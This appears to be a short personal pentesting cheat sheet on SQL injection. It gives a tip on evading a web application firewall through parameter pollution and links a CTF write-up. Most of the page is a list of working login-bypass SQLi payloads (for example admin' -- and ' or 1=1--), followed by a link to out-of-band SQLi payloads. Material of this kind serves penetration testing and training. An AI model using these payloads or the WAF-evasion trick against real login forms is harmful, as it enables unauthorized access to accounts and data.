- If target is protected by a [[WAF]] add same parameter again (parameter pollution) WAF will take second parameter and Application will take 1st.
     	![[Pasted image 20210519204855.png]]
		https://c0r3dump.github.io/CTF/2021/m0leConTeaser/Waffle/
- SQLi on Login/Signup pages
- 

## Login Bypass Payloads
```
' or ''-'
" or ""-"
" or true--
' or true--
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
```

```

### OOB SQL payloads
https://github.com/Gabriel-Labs/OOB-SQLi